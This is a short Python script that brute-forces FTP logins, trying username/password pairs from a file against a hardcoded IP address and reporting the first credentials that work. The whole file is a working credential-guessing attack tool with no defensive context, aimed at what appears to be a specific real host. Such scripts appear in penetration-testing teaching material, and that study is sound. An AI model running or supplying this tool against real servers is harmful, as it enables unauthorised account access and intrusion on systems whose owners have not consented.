import ftplib


def bruteLogin(hostname, passwdFile):
    pF = open(passwdFile, 'r')
    for line in pF.readlines():
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
        print('[+] Trying: ' + userName + '/' + passWord)
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, passWord)
            print('\n[*] ' + str(hostname) +
                  ' FTP Logon Succeeded: ' + userName + '/' + passWord)
            ftp.quit()
            return (userName, passWord)
        except Exception as e:
            pass
    print('\n[-] Could not brute force FTP credentials')
    return (None, None)


host = '119.114.189.244'
passwdFile = '1.txt'
bruteLogin(host, passwdFile)
